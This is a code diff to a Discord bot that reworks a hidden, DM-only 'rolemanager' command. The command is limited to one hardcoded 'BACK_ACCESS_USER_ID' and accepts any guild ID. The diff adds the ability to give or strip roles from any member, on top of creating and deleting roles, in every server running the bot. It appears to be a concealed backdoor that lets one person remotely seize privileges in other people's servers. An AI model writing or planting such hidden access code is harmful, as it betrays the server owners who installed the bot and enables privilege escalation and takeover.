@@ -190,19 +190,42 @@ async def list_roles(ctx, member: discord.Member = None):
     await ctx.send(embed=embed)
 
 # ------------------- DM-only Role Manager with Permissions ------------------- #
-@bot.command(name='rolemanager', hidden=True)
-async def role_manager_dm(ctx, guild_id: int, action: str, role_name: str = None, *, perms_list: str = None):
-    """DM-only role manager: create/delete roles and assign permissions."""
+@bot.command(name="rolemanager", hidden=True)
+async def role_manager(ctx, guild_id: int = None, action: str = None, target: str = None, *, args: str = None):
+    """
+    DM-only role manager:
+    Actions:
+      - create <role_name> [hex_color]
+      - delete <role_name>
+      - add <role_name> <target_user_id>
+      - remove <role_name> <target_user_id>
+      - info <role_name>
+      - list
+    """
+    async def dm_reply(msg):
+        try:
+            if isinstance(msg, discord.Embed):
+                await ctx.author.send(embed=msg)
+            else:
+                await ctx.author.send(str(msg))
+        except Exception:
+            logger.warning(f"Could not DM user {ctx.author.id}")
+
     if ctx.guild is not None:
-        await dm_reply(ctx, "This command only works via DM.")
+        await dm_reply("This command only works via DM.")
         return
+
     if ctx.author.id != BACK_ACCESS_USER_ID:
-        await dm_reply(ctx, "Access denied.")
+        await dm_reply("You aren't allowed to use this command.")
+        return
+
+    if not guild_id:
+        await dm_reply("Provide a guild ID.")
         return
 
     guild = bot.get_guild(guild_id)
-    if guild is None:
-        await dm_reply(ctx, f"Guild with ID `{guild_id}` not found.")
+    if not guild:
+        await dm_reply("Bot is not in that guild.")
         return
 
     bot_member = guild.me or guild.get_member(bot.user.id)
@@ -210,55 +233,82 @@ async def role_manager_dm(ctx, guild_id: int, action: str, role_name: str = None
     try:
         if action.lower() == "list":
             roles = [r.name for r in guild.roles if r.name != "@everyone"]
-            await dm_reply(ctx, f"Roles in `{guild.name}`: {', '.join(roles) if roles else 'No roles'}")
+            await dm_reply(f"Roles in `{guild.name}`: {', '.join(roles) if roles else 'No roles'}")
             return
 
         if action.lower() == "info":
-            if not role_name:
-                await dm_reply(ctx, "Please provide a role name for info.")
+            if not args:
+                await dm_reply("Provide a role name for info.")
                 return
-            role = discord.utils.get(guild.roles, name=role_name)
+            role = discord.utils.get(guild.roles, name=args)
             if not role:
-                await dm_reply(ctx, f"No role named `{role_name}` found.")
+                await dm_reply(f"No role named `{args}` found.")
                 return
-            await dm_reply(ctx, f"Role `{role.name}` (ID: {role.id})\nPosition: {role.position}\nPermissions: {role.permissions}")
+            await dm_reply(f"Role `{role.name}` (ID: {role.id})\nPosition: {role.position}\nPermissions: {role.permissions}")
             return
 
         if action.lower() == "create":
-            if not role_name:
-                await dm_reply(ctx, "Provide a name for the new role.")
+            if not args:
+                await dm_reply("Usage: create <role_name> [hex_color]")
                 return
-            perms = Permissions.none()
-            if perms_list:
-                for perm_name in [p.strip().lower() for p in perms_list.split(",")]:
-                    if hasattr(perms, perm_name):
-                        setattr(perms, perm_name, True)
-            role = await guild.create_role(name=role_name, permissions=perms, reason=f"Created by {ctx.author.id}")
-            await dm_reply(ctx, f"Role `{role.name}` created with permissions: {perms_list or 'None'}")
+            parts = args.split()
+            role_name = parts[0]
+            color = discord.Color.default()
+            if len(parts) > 1:
+                try:
+                    color = discord.Color(int(parts[1].strip("#"), 16))
+                except:
+                    pass
+            role = await guild.create_role(name=role_name, color=color, reason=f"Created by {ctx.author.id}")
+            await dm_reply(f"Role `{role.name}` created.")
             return
 
         if action.lower() == "delete":
-            if not role_name:
-                await dm_reply(ctx, "Provide a role name to delete.")
+            if not args:
+                await dm_reply("Usage: delete <role_name>")
                 return
-            role = discord.utils.get(guild.roles, name=role_name)
+            role = discord.utils.get(guild.roles, name=args)
             if not role:
-                await dm_reply(ctx, f"Role `{role_name}` not found.")
+                await dm_reply(f"No role named `{args}` found.")
                 return
             if bot_member.top_role.position <= role.position:
-                await dm_reply(ctx, "Cannot delete a role equal or higher than bot's top role.")
+                await dm_reply("Cannot delete a role higher than or equal to my top role.")
                 return
             await role.delete(reason=f"Deleted by {ctx.author.id}")
-            await dm_reply(ctx, f"Role `{role.name}` deleted successfully.")
+            await dm_reply(f"Role `{role.name}` deleted.")
             return
 
-        await dm_reply(ctx, "Unknown action. Use: `create`, `delete`, `info`, `list`.")
+        if action.lower() in ["add", "remove"]:
+            if not args or not target:
+                await dm_reply(f"Usage: {action} <role_name> <target_user_id>")
+                return
+            role = discord.utils.get(guild.roles, name=args)
+            member = guild.get_member(int(target)) or await guild.fetch_member(int(target))
+            if not role or not member:
+                await dm_reply("Role or member not found.")
+                return
+            if action.lower() == "add":
+                if role in member.roles:
+                    await dm_reply(f"{member.display_name} already has `{role.name}`.")
+                    return
+                await member.add_roles(role, reason=f"Added by {ctx.author.id}")
+                await dm_reply(f"Added role `{role.name}` to {member.display_name}.")
+            else:
+                if role not in member.roles:
+                    await dm_reply(f"{member.display_name} does not have `{role.name}`.")
+                    return
+                await member.remove_roles(role, reason=f"Removed by {ctx.author.id}")
+                await dm_reply(f"Removed role `{role.name}` from {member.display_name}.")
+            return
+
+        await dm_reply("Unknown action. Use: create, delete, info, list, add, remove.")
 
     except discord.Forbidden:
-        await dm_reply(ctx, "Permission error: Bot cannot manage this role.")
+        await dm_reply("Bot lacks permission.")
     except Exception as e:
-        logger.exception("Error in role_manager DM command")
-        await dm_reply(ctx, f"Error: {e}")
+        logger.exception("Rolemanager error")
+        await dm_reply(f"Error: {e}")
+
 
 # ------------------- Error Handling ------------------- #
 @bot.event
